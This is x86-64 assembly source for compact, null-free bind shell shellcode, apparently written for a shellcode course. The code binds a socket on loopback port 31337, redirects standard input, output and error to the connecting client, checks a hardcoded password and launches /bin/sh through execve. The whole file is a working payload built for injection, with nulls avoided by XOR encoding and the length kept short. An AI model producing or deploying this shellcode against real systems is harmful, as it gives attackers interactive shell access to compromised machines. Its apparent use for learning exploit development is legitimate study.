BITS 64

global _start

section .text
_start:

;Initialize the bind shell - most of this code from the course
;modified to remove nulls, add a passcode, reduce length, and some small behavior changes

localhost_bind:
	; Socket syscall
	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 

	xor rax, rax	
	mov al, 41

	xor rdi, rdi
	mov dil, 2
	
	xor rsi, rsi
	mov sil, 1	

	xor rdx,rdx
	syscall

	; copy socket descriptor to rdi for future use 
	mov rdi, rax

	; create sockaddr_in structure on stack 

	; bzero(&server.sin_zero, 8)
	push rdx
	;zero sin_addr, sin_port, sin_family
	push rdx

	; server.sin_addr.s_addr = htonl(INADDR_LOOPBACK)
	; this is annoying since inaddr loopback has nulls
	; xor with constant to decode
	mov dword [rsp+4], 0x2223235c 
	xor dword [rsp+4], 0x23232323
	; server.sin_port = htons(31337)
	mov word [rsp+2], 0x697a
	; server.sin_family = AF_INET 
	; just need to move byte since we already zeroed buffer	
	mov byte [rsp], 0x2
	

	; bind syscall 
	; bind(sock, (struct sockaddr *)&server, sockaddr_len)
	; syscall number 49
	xor rax, rax
	mov al, 49
	mov rsi, rsp
	mov dl, 16
	syscall

	; listen syscall
	; listen(sock, MAX_CLIENTS)
	; syscall number 50

	xor rax, rax
	mov al, 50
	xor rsi, rsi
	mov sil, 2
	syscall

	; accept syscall
	; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
	; syscall number 43
	xor rax, rax
	mov al, 43
	sub rsp, 16
	mov rsi, rsp
        mov byte [rsp-1], 16
	sub rsp, 1
        mov rdx, rsp

        syscall

	; store the client socket description 
	mov r9, rax 

        ; don't bother with closing parent for reduced space
	;xor rax, rax
        ;mov al, 3
        ;syscall

        ; duplicate sockets

        ; dup2 (new, old)
	; set client socket as std_out, std_in, std_error (fd 0,1,2)
        mov rdi, r9
	xor rax, rax
        mov al, 33
	xor rsi, rsi
        syscall

	xor rax, rax
        mov al, 33
	xor rsi, rsi
        mov sil, 1
        syscall

	xor rax, rax
        mov al, 33
	xor rsi, rsi
        mov sil, 2
        syscall
; password check code starts here - 7 byte password + newline 
read_password: ; read syscall - read onto stack ; allocate space on stack sub rsp, 8	
	; make syscall
	; read(fd, *buf, count)
	xor rax, rax 
	xor rdi, rdi
	mov rsi, rsp	
	xor rdx, rdx
	mov dl, 8
	syscall			

;compare password with mrtfsh1
compare_password:
	mov rbx,0x0a3168736674726d	
	mov rdi,[rsp]
	cmp rbx,rdi	
	jne exit
		
	
; execve code starts here - mostly provided in course
execve_sh:
        ; First NULL push
        xor rax, rax
        push rax

        ; push /bin//sh in reverse
	mov rbx, 0x68732f2f6e69622f
	push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall

;we don't exit gracefully or anything like that for space
exit:
	nop
